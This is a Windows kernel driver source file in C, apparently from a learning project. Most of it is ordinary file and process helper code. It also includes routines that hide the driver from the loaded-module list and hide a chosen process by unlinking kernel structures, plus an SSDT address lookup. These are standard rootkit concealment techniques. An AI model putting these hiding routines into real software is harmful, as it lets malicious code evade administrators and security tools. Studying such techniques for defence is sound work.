#include <ntifs.h>
#include <ntddk.h>
#include "ProcessFunc.h"
#include "CommonDef.h"
#include "DriverEntry.h"
//
//#include "DriverEntry.h"
//
#define MAX_PROCESS_COUNT  100000
#define PROCESS_QUERY_INFORMATION          (0x0400)  


NTSTATUS createFile(wchar_t * filepath,
					ULONG access,
					ULONG share,
					ULONG openModel,
					BOOLEAN isDir,
					HANDLE * hFile)
{
	NTSTATUS status = STATUS_SUCCESS;

	IO_STATUS_BLOCK StatusBlock = { 0 };
	ULONG           ulShareAccess = share;
	ULONG ulCreateOpt = FILE_SYNCHRONOUS_IO_NONALERT;

	UNICODE_STRING path;
	RtlInitUnicodeString(&path, filepath);

	// 1. ��ʼ��OBJECT_ATTRIBUTES������
	OBJECT_ATTRIBUTES objAttrib = { 0 };
	ULONG ulAttributes = OBJ_CASE_INSENSITIVE/*�����ִ�Сд*/ | OBJ_KERNEL_HANDLE/*�ں˾��*/;
	InitializeObjectAttributes(&objAttrib,    // ���س�ʼ����ϵĽṹ��
							   &path,      // �ļ���������
							   ulAttributes,  // ��������
							   NULL, NULL);   // һ��ΪNULL

	// 2. �����ļ�����
	ulCreateOpt |= isDir ? FILE_DIRECTORY_FILE : FILE_NON_DIRECTORY_FILE;

	status = ZwCreateFile(hFile,                 // �����ļ����
						  access,				 // �ļ���������
						  &objAttrib,            // OBJECT_ATTRIBUTES
						  &StatusBlock,          // ���ܺ����Ĳ������
						  0,                     // ��ʼ�ļ���С
						  FILE_ATTRIBUTE_NORMAL, // �½��ļ�������
						  ulShareAccess,         // �ļ�����ʽ
						  openModel,			 // �ļ�������򿪲������򴴽�
						  ulCreateOpt,           // �򿪲����ĸ��ӱ�־λ
						  NULL,                  // ��չ������
						  0);                    // ��չ����������
	return status;
}



NTSTATUS removeFile(wchar_t* filepath)
{

	UNICODE_STRING path;
	RtlInitUnicodeString(&path, filepath);

	// 1. ��ʼ��OBJECT_ATTRIBUTES������
	OBJECT_ATTRIBUTES objAttrib = { 0 };
	ULONG             ulAttributes = OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE;
	InitializeObjectAttributes(&objAttrib,    // ���س�ʼ����ϵĽṹ��
							   &path,		  // �ļ���������
							   ulAttributes,  // ��������
							   NULL,          // ��Ŀ¼(һ��ΪNULL)
							   NULL);         // ��ȫ����(һ��ΪNULL)
	// 2. ɾ��ָ���ļ�/�ļ���
	return ZwDeleteFile(&objAttrib);
}

NTSTATUS firstFile(wchar_t* dir, HANDLE* hFind, FILE_BOTH_DIR_INFORMATION* fileInfo, int size)
{
	NTSTATUS status = STATUS_SUCCESS;
	IO_STATUS_BLOCK isb = { 0 };
	// 1. ��Ŀ¼
	status = createFile(dir,
						GENERIC_READ,
						FILE_SHARE_READ,
						FILE_OPEN_IF,
						TRUE,
						hFind);
	if (STATUS_SUCCESS != status)
		return status;

	// ��һ�ε���,��ȡ���軺�����ֽ���
	status = ZwQueryDirectoryFile(*hFind, /*Ŀ¼���*/
								  NULL, /*�¼�����*/
								  NULL, /*���֪ͨ����*/
								  NULL, /*���֪ͨ���̸��Ӳ���*/
								  &isb, /*IO״̬*/
								  fileInfo, /*������ļ���Ϣ*/
								  size,/*�ļ���Ϣ���������ֽ���*/
								  FileBothDirectoryInformation,/*��ȡ��Ϣ������*/
								  TRUE,/*�Ƿ�ֻ��ȡ��һ��*/
								  0,
								  TRUE/*�Ƿ�����ɨ��Ŀ¼*/);
	
	return status;
}

NTSTATUS nextFile(HANDLE hFind, FILE_BOTH_DIR_INFORMATION* fileInfo, int size)
{
	IO_STATUS_BLOCK isb = { 0 };
	// ��һ�ε���,��ȡ���軺�����ֽ���
	return ZwQueryDirectoryFile(hFind, /*Ŀ¼���*/
								NULL, /*�¼�����*/
								NULL, /*���֪ͨ����*/
								NULL, /*���֪ͨ���̸��Ӳ���*/
								&isb, /*IO״̬*/
								fileInfo, /*������ļ���Ϣ*/
								size,/*�ļ���Ϣ���������ֽ���*/
								FileBothDirectoryInformation,/*��ȡ��Ϣ������*/
								TRUE,/*�Ƿ�ֻ��ȡ��һ��*/
								0,
								FALSE/*�Ƿ�����ɨ��Ŀ¼*/);
}

void listDirFree(FILE_BOTH_DIR_INFORMATION* fileInfo)
{
	ExFreePool(fileInfo);
}


UINT32 APGetProcessNum()
{

	UINT32 ProcessCount = 0;

	for (UINT32 ProcessId = 0; ProcessId < 100000; ProcessId += 4)
	{
		NTSTATUS  Status = STATUS_UNSUCCESSFUL;
		PEPROCESS EProcess = NULL;
		Status = PsLookupProcessByProcessId((HANDLE)ProcessId, &EProcess);
		if (NT_SUCCESS(Status))
		{
			ProcessCount++;
			ObDereferenceObject(EProcess);   // �����ü���
		}
	}
	

	return ProcessCount;
}

typedef NTSTATUS(*pfnZwQueryInformationProcess)(
	HANDLE           ProcessHandle,
	PROCESSINFOCLASS ProcessInformationClass,
	PVOID            ProcessInformation,
	ULONG            ProcessInformationLength,
	PULONG           ReturnLength
	);
PVOID  GetFunctionAddressByName(WCHAR *wzFunction)
{
	UNICODE_STRING uniFunction;
	PVOID AddrBase = NULL;

	if (wzFunction && wcslen(wzFunction) > 0)
	{
		RtlInitUnicodeString(&uniFunction, wzFunction);
		AddrBase = MmGetSystemRoutineAddress(&uniFunction);
	}

	return AddrBase;
}
NTSTATUS GetProcessImagePath(ULONG ulProcessId,WCHAR*  ProcessImagePath)
{
	NTSTATUS Status;
	HANDLE hProcess;
	PEPROCESS EProcess;
	ULONG ulRet;
	ULONG ulLength;
	PVOID Buffer;
	PUNICODE_STRING ProcessImagePathName;
	pfnZwQueryInformationProcess ZwQueryInformationProcessAddress = NULL;

	Status = PsLookupProcessByProcessId((HANDLE)ulProcessId, &EProcess);

	ZwQueryInformationProcessAddress = (pfnZwQueryInformationProcess)GetFunctionAddressByName(L"ZwQueryInformationProcess");

	if (ZwQueryInformationProcessAddress == NULL)
	{
		return STATUS_UNSUCCESSFUL;
	}

	if (!NT_SUCCESS(Status))
	{
		return Status;
	}

	Status = ObOpenObjectByPointer(EProcess,
		OBJ_KERNEL_HANDLE,
		NULL,
		GENERIC_READ,
		*PsProcessType,
		KernelMode,
		&hProcess);


	if (!NT_SUCCESS(Status))
	{
		return Status;
	}

	Status = ZwQueryInformationProcessAddress(hProcess,
		ProcessImageFileName,
		NULL,
		0,
		&ulRet);


	if (STATUS_INFO_LENGTH_MISMATCH != Status)
	{
		return Status;

	}

	Buffer = ExAllocatePoolWithTag(PagedPool, ulRet, 'itnA');

	ulLength = ulRet;

	if (NULL == Buffer)
	{
		return STATUS_INSUFFICIENT_RESOURCES;
	}

	Status = ZwQueryInformationProcessAddress(hProcess,
		ProcessImageFileName,
		Buffer,
		ulLength,
		&ulRet);

	if (NT_SUCCESS(Status))
	{
		ProcessImagePathName = (PUNICODE_STRING)Buffer;
		wcscpy(ProcessImagePath, ProcessImagePathName->Buffer);
	}

	ZwClose(hProcess);
	ExFreePool(Buffer);
	return Status;
}

int HideDriver(PDRIVER_OBJECT pDriverObj, PUNICODE_STRING uniDriverName)
{
	//_asm int 3;
	PLDR_DATA_TABLE_ENTRY entry = (PLDR_DATA_TABLE_ENTRY)pDriverObj->DriverSection;
	PLDR_DATA_TABLE_ENTRY fristentry = entry;
	while ((PLDR_DATA_TABLE_ENTRY)entry->InLoadOrderLinks.Flink != fristentry)
	{
		if (entry->FullDllName.Buffer != 0)
		{
			if (RtlCompareUnicodeString(uniDriverName,
				&(entry->BaseDllName), FALSE) == 0)
			{
				DbgPrint("�������� %ws �ɹ�\n", entry->BaseDllName.Buffer);
				//�޸�Flink��Blink���������ص�����
				*((ULONG*)entry->InLoadOrderLinks.Blink) =
					(ULONG)entry->InLoadOrderLinks.Flink;
				entry->InLoadOrderLinks.Flink->Blink =
					entry->InLoadOrderLinks.Blink;

				entry->InLoadOrderLinks.Flink = (LIST_ENTRY*)
					&(entry->InLoadOrderLinks.Flink);
				entry->InLoadOrderLinks.Blink = (LIST_ENTRY*)
					&(entry->InLoadOrderLinks.Flink);
				return 1;
				break;
			}
		}
		//������ǰ��
		entry = (PLDR_DATA_TABLE_ENTRY)entry->InLoadOrderLinks.Flink;
	}
	return 0;
}


LONG GetFunticonAddr(PSSDTEntry KeServiceDescriptorTable, LONG lgSsdtIndex)
{
	LONG lgSsdtAddr = 0;
	//��ȡSSDT��Ļ�ַ  
	lgSsdtAddr = (LONG)KeServiceDescriptorTable->ServiceTableBase;

	PLONG plgSsdtFunAddr = 0;
	//��ȡ�ں˺����ĵ�ַָ��  
	plgSsdtFunAddr = (PLONG)(lgSsdtAddr + lgSsdtIndex * 4);

	//�����ں˺����ĵ�ַ  
	return (*plgSsdtFunAddr);
}
void HideProcess(ULONG hidePID)
{
	// 1. ��ȡ��ǰ���̶���
	ULONG_PTR proc = (ULONG_PTR)PsGetCurrentProcess();
	// 2. ��ȡ���̶����ڵĵ�ǰ���������
	LIST_ENTRY* pProcList = (LIST_ENTRY*)(proc + 0xB8);
	LIST_ENTRY* listBegin = pProcList;
	// ��ʼ����
	do {
		proc = (ULONG_PTR)pProcList - 0xB8;
		// ��ȡ����ID,����·��,EPROCESS.

		ULONG pid = (ULONG)PsGetProcessId((PEPROCESS)proc); //*(ULONG*)(proc + 0xB4);
		if (pid == hidePID)
		{
			CHAR* path = PsGetProcessImageFileName((PEPROCESS)proc);//(CHAR*)proc + 0x16c;
			DbgPrint("���ؽ��� %s �ɹ�\n", path);
			*((ULONG*)pProcList->Blink) =
				(ULONG)pProcList->Flink;
			pProcList->Flink->Blink =
				pProcList->Blink;

			pProcList->Flink = (LIST_ENTRY*)
				&(pProcList->Flink);
			pProcList->Blink = (LIST_ENTRY*)
				&(pProcList->Flink);
			return;
		}

		// �õ������������һ��.
		pProcList = pProcList->Flink;
	} while (pProcList != listBegin);

}
NTSTATUS readFile(HANDLE hFile,
	ULONG offsetLow,
	ULONG offsetHig,
	ULONG sizeToRead,
	PVOID pBuff,
	ULONG* read)
{
	NTSTATUS status;
	IO_STATUS_BLOCK isb = { 0 };
	LARGE_INTEGER offset;
	// ����Ҫ��ȡ���ļ�ƫ��
	offset.HighPart = offsetHig;
	offset.LowPart = offsetLow;

	status = ZwReadFile(hFile,/*�ļ����*/
		NULL,/*�¼�����,�����첽IO*/
		NULL,/*APC�����֪ͨ����:�����첽IO*/
		NULL,/*���֪ͨ������ĸ��Ӳ���*/
		&isb,/*IO״̬*/
		pBuff,/*�����ļ����ݵĻ�����*/
		sizeToRead,/*Ҫ��ȡ���ֽ���*/
		&offset,/*Ҫ��ȡ���ļ�λ��*/
		NULL);
	if (status == STATUS_SUCCESS)
		*read = isb.Information;
	return status;
}